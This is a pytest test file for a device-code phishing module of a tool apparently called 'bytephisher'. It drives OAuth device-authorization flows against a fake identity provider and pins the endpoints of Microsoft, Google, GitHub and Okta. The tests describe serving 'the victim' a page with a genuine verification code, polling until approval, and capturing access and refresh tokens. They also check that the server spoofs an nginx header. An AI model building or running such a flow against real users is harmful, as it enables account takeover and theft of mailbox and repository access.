"""Device-authorization relay: a fake identity provider drives the real flow.

Everything is exercised over HTTP against a local IdP that behaves like RFC 8628
says: `/devicecode` hands out a code, `/token` answers `authorization_pending`,
then `slow_down`, then a token - and the refusal paths of a tenant that blocks the
grant are covered too. The landing page is checked for the property that makes the
technique worth having: it contains the provider's **genuine** verification URL and
the victim's code, and nothing that imitates the provider.
"""
import json
import os
import sys
import threading
import time
import urllib.parse
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

import pytest

HERE = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, HERE)

from core import devicecode as D  # noqa: E402

pytestmark = pytest.mark.integration


def free_port():
    import socket
    s = socket.socket()
    s.bind(("127.0.0.1", 0))
    port = s.getsockname()[1]
    s.close()
    return port


class IdP:
    """A minimal RFC 8628 provider whose behaviour a test can steer."""

    def __init__(self, answers=("authorization_pending", "slow_down", "token"),
                 devicecode_error=None):
        self.answers = list(answers)
        self.devicecode_error = devicecode_error
        self.requests = []            # (path, form dict, content_type)
        self.interval = 1
        self.port = free_port()
        outer = self

        class H(BaseHTTPRequestHandler):
            def log_message(self, *a):
                pass

            def _json(self, payload, status=200):
                raw = json.dumps(payload).encode()
                self.send_response(status)
                self.send_header("Content-Type", "application/json")
                self.send_header("Content-Length", str(len(raw)))
                self.end_headers()
                self.wfile.write(raw)

            def do_POST(self):
                n = int(self.headers.get("Content-Length") or 0)
                raw = self.rfile.read(n).decode()
                form = {k: v[0] for k, v in urllib.parse.parse_qs(raw).items()}
                outer.requests.append((self.path, form,
                                       self.headers.get("Content-Type") or ""))
                if self.path.endswith("/devicecode"):
                    if outer.devicecode_error:
                        self._json(outer.devicecode_error, status=400)
                        return
                    self._json({
                        "device_code": "DEV-CODE-1",
                        "user_code": "KQ7T-4MP2",
                        "verification_uri": f"http://127.0.0.1:{outer.port}/activate",
                        "verification_uri_complete":
                            f"http://127.0.0.1:{outer.port}/activate?code=KQ7T-4MP2",
                        "expires_in": 600,
                        "interval": outer.interval,
                    })
                    return
                if self.path.endswith("/token"):
                    if form.get("grant_type") == "refresh_token":
                        self._json({"access_token": "AT-2", "refresh_token": "RT-2",
                                    "expires_in": 3600})
                        return
                    nxt = outer.answers.pop(0) if outer.answers else "token"
                    if nxt == "token":
                        self._json({"access_token": "AT-1", "refresh_token": "RT-1",
                                    "token_type": "Bearer", "expires_in": 3600,
                                    "scope": "mail.read"})
                    else:
                        self._json({"error": nxt}, status=400)
                    return
                self._json({"error": "not_found"}, status=404)

        self.httpd = ThreadingHTTPServer(("127.0.0.1", self.port), H)
        self.thread = threading.Thread(target=self.httpd.serve_forever, daemon=True)

    def __enter__(self):
        self.thread.start()
        time.sleep(0.15)
        return self

    def __exit__(self, *exc):
        self.httpd.shutdown()
        self.httpd.server_close()

    def flow(self, **kw):
        return D.DeviceCodeFlow("custom", "test-client",
                                issuer=f"http://127.0.0.1:{self.port}",
                                scope="openid offline_access", **kw)


# ============================================================ the happy path ==
class TestTheFlow:

    def test_start_asks_with_a_form_encoded_body(self):
        with IdP() as idp:
            f = idp.flow().start()
            assert f.user_code == "KQ7T-4MP2"
            assert f.device_code == "DEV-CODE-1"
            assert f.interval == 1
            assert f.status == "pending"
            path, form, ctype = idp.requests[0]
            assert path.endswith("/devicecode")
            # RFC 8628 mandates form encoding; a JSON body gets invalid_request
            assert ctype.startswith("application/x-www-form-urlencoded"), ctype
            assert form["client_id"] == "test-client"
            assert form["scope"] == "openid offline_access"

    def test_poll_survives_pending_and_slow_down_then_takes_the_token(self):
        with IdP() as idp:
            f = idp.flow().start()
            assert f.poll_once() == "pending"
            assert f.poll_once() == "pending"          # slow_down raises the interval
            assert f.interval == 6, f.interval
            assert f.poll_once() == "token"
            assert f.tokens["access_token"] == "AT-1"
            assert f.tokens["refresh_token"] == "RT-1"
            assert f.poll_count == 3
            # the grant type is the device-code URN, not a bare code exchange
            _p, form, _c = idp.requests[-1]
            assert form["grant_type"] == D.DEVICE_GRANT
            assert form["device_code"] == "DEV-CODE-1"

    def test_poll_loops_until_the_token_arrives(self):
        with IdP(answers=["authorization_pending"] * 3 + ["token"]) as idp:
            f = idp.flow().start()
            slept = []
            assert f.poll(sleep=slept.append, max_wait=30) == "token"
            assert slept == [1, 1, 1], slept          # the provider's interval is used

    def test_poll_stops_at_the_deadline(self):
        with IdP(answers=["authorization_pending"] * 50) as idp:
            f = idp.flow().start()
            t0 = time.time()
            st = f.poll(sleep=lambda s: time.sleep(0.01), max_wait=0.5)
            assert st == "pending"
            assert time.time() - t0 < 5, "the loop did not stop at its deadline"

    def test_a_refresh_token_can_be_exchanged(self):
        with IdP() as idp:
            f = idp.flow().start()
            f.poll(sleep=lambda s: None, max_wait=10)
            assert f.tokens["access_token"] == "AT-1"
            out = f.refresh()
            assert out["access_token"] == "AT-2"
            assert out["refresh_token"] == "RT-2"

    def test_refresh_without_a_token_is_an_error(self):
        with IdP() as idp:
            f = idp.flow().start()
            with pytest.raises(D.DeviceCodeError):
                f.refresh()

    def test_poll_before_start_is_an_error(self):
        with IdP() as idp:
            with pytest.raises(D.DeviceCodeError):
                idp.flow().poll_once()


# ==================================================== expired and refused =====
class TestRefusals:

    def test_expired_token_ends_the_flow(self):
        with IdP(answers=["expired_token"]) as idp:
            f = idp.flow().start()
            assert f.poll_once() == "expired"
            assert f.poll_once() == "expired"          # and it stays ended
            assert f.status == "expired"

    def test_access_denied_ends_the_flow(self):
        with IdP(answers=["access_denied"]) as idp:
            f = idp.flow().start()
            assert f.poll_once() == "denied"

    def test_a_tenant_that_blocks_the_grant_says_so(self):
        """The most likely real-world failure, and it must not look like success."""
        blocked = {"error": "unauthorized_client",
                   "error_description": "Device flow is disabled for this tenant"}
        with IdP(devicecode_error=blocked) as idp:
            with pytest.raises(D.DeviceCodeError) as e:
                idp.flow().start()
            assert "unauthorized_client" in str(e.value)
            assert "disabled" in str(e.value)

    def test_an_unknown_provider_is_refused_before_any_request(self):
        with pytest.raises(D.DeviceCodeError):
            D.DeviceCodeFlow("definitely-not-a-provider", "x")

    def test_a_missing_client_id_is_refused_before_any_request(self):
        with pytest.raises(D.DeviceCodeError) as e:
            D.DeviceCodeFlow("microsoft", "")
        assert "client_id" in str(e.value)


# ============================================================== the landing ==
class TestTheLandingPage:

    def test_it_carries_the_real_verification_url_and_the_code(self):
        with IdP() as idp:
            m = D.DeviceCodeManager()
            f = m.start("custom", "test-client", issuer=f"http://127.0.0.1:{idp.port}",
                        verification_uri=f"http://127.0.0.1:{idp.port}/activate")
            html = m.landing_html(f.tag, link_prefix="https://camp.test")
            assert "KQ7T-4MP2" in html
            assert f"http://127.0.0.1:{idp.port}/activate" in html
            # the status poll the page runs must point at OUR route
            assert f"/__bh/dc/{f.tag}/status" in html
            assert "https://camp.test/__bh/dc/" in html

    def test_it_imitates_nothing(self):
        """The technique's value is that there is no lookalike domain to spot."""
        with IdP() as idp:
            m = D.DeviceCodeManager()
            f = m.start("custom", "test-client", issuer=f"http://127.0.0.1:{idp.port}")
            html = m.landing_html(f.tag).lower()
            for giveaway in ("login.microsoftonline.com", "accounts.google.com",
                             "password"):
                assert giveaway not in html, giveaway

    def test_an_unknown_tag_is_an_expired_page(self):
        m = D.DeviceCodeManager()
        assert "expired" in m.landing_html("nope").lower()


# ============================================================== the manager ==
class TestTheManager:

    def test_poll_all_reports_a_completed_flow_once(self):
        with IdP(answers=["token"]) as idp:
            got = []
            m = D.DeviceCodeManager()
            m.start("custom", "test-client", issuer=f"http://127.0.0.1:{idp.port}")
            done = m.poll_all(on_token=got.append)
            assert len(done) == 1
            assert done[0]["provider"] == "custom"
            assert done[0]["tokens"]["access_token"] == "AT-1"
            assert len(got) == 1
            assert m.poll_all(on_token=got.append) == []      # not reported twice
            assert m.stats() == {"flows": 1, "pending": 0, "tokens": 1}

    def test_a_dead_provider_does_not_stop_the_others(self):
        with IdP(answers=["token"]) as good:
            m = D.DeviceCodeManager()
            f_good = m.start("custom", "test-client",
                             issuer=f"http://127.0.0.1:{good.port}")
            f_dead = m.start("custom", "test-client",
                             issuer=f"http://127.0.0.1:{good.port}")
            # the provider becomes unreachable AFTER the flow started (a real failure
            # mode): the other flow must still be polled and still complete
            f_dead.issuer = "http://127.0.0.1:9"                 # discard port
            done = m.poll_all()
            assert [d["tag"] for d in done] == [f_good.tag]
            assert f_dead.status == "pending"                    # still retryable
            assert f_dead.error

    def test_the_flow_list_is_capped(self):
        with IdP() as idp:
            m = D.DeviceCodeManager(max_flows=2)
            for _ in range(4):
                m.start("custom", "test-client", issuer=f"http://127.0.0.1:{idp.port}")
            assert m.stats()["flows"] == 2
            assert len(m.summary()) == 2

    def test_the_summary_never_carries_tokens(self):
        with IdP(answers=["token"]) as idp:
            m = D.DeviceCodeManager()
            m.start("custom", "test-client", issuer=f"http://127.0.0.1:{idp.port}")
            m.poll_all()
            blob = json.dumps(m.summary())
            assert "AT-1" not in blob and "RT-1" not in blob
            assert "access_token" not in blob


# ========================================================== serving it =======
class TestTheLandingServer:
    """The page and its status route, served the way the rest of the tool serves."""

    @staticmethod
    def _get(port, path, host="127.0.0.1"):
        import http.client
        conn = http.client.HTTPConnection("127.0.0.1", port, timeout=10)
        conn.request("GET", path, headers={"Host": host})
        r = conn.getresponse()
        body = r.read().decode()
        headers = r.getheaders()
        status = r.status
        conn.close()
        return status, body, headers

    def test_the_page_and_status_route(self):
        with IdP(answers=["authorization_pending", "token"]) as idp:
            m = D.DeviceCodeManager()
            f = m.start("custom", "test-client", issuer=f"http://127.0.0.1:{idp.port}",
                        verification_uri=f"http://127.0.0.1:{idp.port}/activate")
            port = free_port()
            httpd, poller = D.serve(m, port, link_prefix="https://camp.test",
                                    poll=False)
            try:
                time.sleep(0.2)
                st, body, _h = self._get(port, f"/dc/{f.tag}")
                assert st == 200 and "KQ7T-4MP2" in body
                st, body, _h = self._get(port, f"/__bh/dc/{f.tag}/status")
                assert st == 200
                st_json = json.loads(body)
                assert st_json["status"] == "pending"
                # a live countdown, so the exact value drifts by a second or two
                assert 590 <= st_json["expires_in"] <= 600, st_json
                st, body, _h = self._get(port, "/__bh/dc/nope/status")
                assert json.loads(body)["status"] == "expired"
                st, body, _h = self._get(port, "/nothing-here")
                assert st == 404
            finally:
                httpd.shutdown()
                httpd.server_close()

    def test_it_never_advertises_python_and_sends_one_date(self):
        with IdP() as idp:
            m = D.DeviceCodeManager()
            m.start("custom", "test-client", issuer=f"http://127.0.0.1:{idp.port}")
            port = free_port()
            httpd, _p = D.serve(m, port, poll=False, server_header="nginx")
            try:
                time.sleep(0.2)
                _st, _b, headers = self._get(port, "/anything")
                names = [k.lower() for k, _v in headers]
                assert names.count("server") == 1, headers
                assert names.count("date") == 1, headers
                assert {k.lower(): v for k, v in headers}["server"] == "nginx"
                blob = " ".join(f"{k}: {v}" for k, v in headers).lower()
                assert "python" not in blob and "basehttp" not in blob
            finally:
                httpd.shutdown()
                httpd.server_close()

    def test_the_poller_reports_a_completed_flow(self):
        with IdP(answers=["authorization_pending", "token"]) as idp:
            got = []
            m = D.DeviceCodeManager()
            f = m.start("custom", "test-client", issuer=f"http://127.0.0.1:{idp.port}")
            port = free_port()
            httpd, poller = D.serve(m, port, on_token=got.append, poll_interval=1)
            try:
                deadline = time.time() + 12
                while time.time() < deadline and not got:
                    time.sleep(0.2)
                assert got, "the poller never reported the approved flow"
                assert got[0]["tokens"]["access_token"] == "AT-1"
                assert m.get(f.tag).status == "token"
                # and the page now tells the victim they are done
                _st, body, _h = self._get(port, f"/__bh/dc/{f.tag}/status")
                assert json.loads(body)["status"] == "token"
            finally:
                httpd.shutdown()
                httpd.server_close()


# ============================================ the real CLI, end to end =======
class TestTheCliMode:
    """`--devicecode` through the real entry point: the operator starts a flow, the
    victim's page serves the code, and approval prints the tokens."""

    def test_the_cli_starts_a_flow_serves_the_page_and_reports_approval(self):
        import subprocess
        with IdP(answers=["authorization_pending", "authorization_pending", "token"]) as idp:
            port = free_port()
            cmd = [sys.executable, os.path.join(HERE, "bytephisher.py"),
                   "--devicecode", "custom", "--dc-client-id", "test-client",
                   # `custom` takes its issuer from the tenant field
                   "--dc-tenant", f"http://127.0.0.1:{idp.port}",
                   "--dc-base", f"http://127.0.0.1:{port}",
                   "--port", str(port), "-t", "none", "--no-tui"]
            env = dict(os.environ, BYTEPHISHER_HOME=HERE)
            p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                 text=True, cwd=HERE, env=env)
            try:
                out = ""
                deadline = time.time() + 25
                while time.time() < deadline:
                    line = p.stdout.readline()
                    out += line
                    if "send the victim" in line:      # the code is printed with it
                        break
                assert "DEVICE CODE" in out, out
                assert "KQ7T-4MP2" in out, out          # the code is shown to the operator
                # the victim's page really is served by the running process
                import http.client
                conn = http.client.HTTPConnection("127.0.0.1", port, timeout=10)
                import re as _re
                tag = _re.search(r"/dc/[A-Za-z0-9_-]+", out)
                assert tag, out
                conn.request("GET", tag.group(0))
                r = conn.getresponse()
                body = r.read().decode()
                conn.close()
                assert r.status == 200 and "KQ7T-4MP2" in body, body[:200]
                assert f"http://127.0.0.1:{idp.port}/activate" in body
            finally:
                p.terminate()
                try:
                    p.wait(timeout=10)
                except Exception:
                    p.kill()


# ======================================================== vendor endpoints ====
class TestTheEndpoints:
    """Guessing a vendor's endpoint is a silent failure, so each one is pinned."""

    def test_the_paths_are_the_vendors_own(self):
        p = D.PROVIDERS
        assert p["microsoft"]["device_path"] == "/devicecode"
        assert p["microsoft"]["token_path"] == "/token"
        # Google's device authorization lives at /device/code: /devicecode is a 404
        assert p["google"]["device_path"] == "/device/code"
        assert p["google"]["token_path"] == "/token"
        assert p["github"]["device_path"] == "/login/device/code"
        assert p["github"]["token_path"] == "/login/oauth/access_token"
        assert p["okta"]["device_path"] == "/v1/device"

    def test_a_flow_builds_the_urls_from_its_provider(self):
        g = D.DeviceCodeFlow("google", "cid")
        assert f"{g.issuer}{g.device_path}" == "https://oauth2.googleapis.com/device/code"
        m = D.DeviceCodeFlow("microsoft", "cid", tenant="contoso.onmicrosoft.com")
        assert m.issuer ==             "https://login.microsoftonline.com/contoso.onmicrosoft.com/oauth2/v2.0"
        assert f"{m.issuer}{m.device_path}".endswith("/oauth2/v2.0/devicecode")

    def test_an_override_issuer_is_honoured(self):
        f = D.DeviceCodeFlow("custom", "cid", issuer="http://127.0.0.1:9/",
                             scope="s")
        assert f.issuer == "http://127.0.0.1:9"          # trailing slash trimmed
        assert f.device_path == "/devicecode"


@pytest.mark.live
class TestAgainstTheRealProviders:
    """The probe that found the Google bug, kept as a test.

    A wrong path answers 404 (an HTML error page); a right path answers with a real
    OAuth error, which is what makes this a check rather than a guess.
    """

    @staticmethod
    def _probe(url, data):
        import urllib.error
        import urllib.request
        req = urllib.request.Request(
            url, data=urllib.parse.urlencode(data).encode(),
            headers={"Content-Type": "application/x-www-form-urlencoded",
                     "Accept": "application/json", "User-Agent": "Mozilla/5.0"})
        try:
            with urllib.request.urlopen(req, timeout=20) as r:
                return r.status, r.read().decode()
        except urllib.error.HTTPError as e:
            return e.code, e.read().decode()
        except Exception as e:                    # offline: skip rather than fail
            pytest.skip(f"no network: {e}")

    def test_microsoft_answers_a_real_oauth_error(self):
        st, body = self._probe(
            "https://login.microsoftonline.com/common/oauth2/v2.0/devicecode",
            {"client_id": "00000000-0000-0000-0000-000000000000", "scope": "openid"})
        assert st == 400 and "error" in body.lower(), (st, body[:200])

    def test_googles_device_path_is_the_one_we_use(self):
        good = "https://oauth2.googleapis.com/device/code"
        st, body = self._probe(good, {"client_id": "x", "scope": "openid"})
        assert st in (400, 401) and "invalid_client" in body, (st, body[:200])
        # and the path we do NOT use is a 404, so this test would catch a regression
        st_bad, _b = self._probe("https://oauth2.googleapis.com/devicecode",
                                 {"client_id": "x", "scope": "openid"})
        assert st_bad == 404, st_bad


class TestTheAuditFixes:
    """Each of these is the behaviour each test pins."""

    def test_a_transport_blip_does_not_abort_the_poll(self, monkeypatch):
        # one URLError 1 s into an 8 s window ended the whole poll and the
        # operator was told the flow had failed
        with IdP(answers=("token",)) as idp:
            f = idp.flow().start()
            calls = {"n": 0}
            real = f.poll_once

            def flaky():
                calls["n"] += 1
                if calls["n"] == 1:
                    raise D.DeviceCodeError("connection reset")
                return real()

            monkeypatch.setattr(f, "poll_once", flaky)
            assert f.poll(max_wait=5) == "token"
            assert calls["n"] >= 2, "the poll gave up on the first blip"

    def test_an_unreachable_provider_is_a_refusal_not_a_traceback(self):
        # a dead issuer escaped as URLError and reached the CLI as a traceback
        dead = free_port()          # nothing listens here
        f = D.DeviceCodeFlow(provider="custom", client_id="c",
                             tenant=f"http://127.0.0.1:{dead}")
        with pytest.raises(D.DeviceCodeError) as ei:
            f.start()
        assert "unreachable" in str(ei.value)

    def test_a_custom_provider_without_an_issuer_says_what_to_pass(self):
        with pytest.raises(D.DeviceCodeError) as ei:
            D.DeviceCodeFlow(provider="custom", client_id="c", issuer="", tenant="")
        assert "--dc-tenant" in str(ei.value)

    def test_a_duplicate_tag_keeps_the_maps_in_step(self):
        with IdP() as idp:
            m = D.DeviceCodeManager()
            base = f"http://127.0.0.1:{idp.port}"
            m.start("custom", "c", issuer=base, tag="same")
            m.start("custom", "c", issuer=base, tag="same")
            assert len(m.summary()) == 1, "the tag was listed twice"
            assert m.order == ["same"]
            assert m.get("same") is not None

    def test_a_refresh_merges_instead_of_replacing(self):
        # a refresh answer carries only the new tokens; the flow's own view must keep
        # the scope / id_token / token_type it already had
        with IdP(answers=("token",)) as idp:
            f = idp.flow().start()
            assert f.poll(max_wait=10) == "token"
            f.tokens = {"access_token": "OLD", "refresh_token": "RT", "scope": "mail.read",
                        "id_token": "IDT", "token_type": "Bearer"}
            idp.answers = ["token"]
            f.refresh()
            assert f.tokens["access_token"].startswith("AT-"), f.tokens
            assert f.tokens["scope"] == "mail.read", "refresh dropped the scope"
            assert f.tokens["id_token"] == "IDT"
            assert f.tokens["token_type"] == "Bearer"

    def test_a_hand_edited_expiry_does_not_break_the_readers(self):
        from core import session as S
        rec = S.new_record("a" * 32)
        S.add_oauth(rec, {"access_token": "AT", "expires_at": "soon"})
        assert S.oauth_valid(rec) is True          # unreadable expiry == no expiry
        summary = S.oauth_summary(rec)             # must not raise
        assert summary["expires_in"] is None and summary["expired"] is False
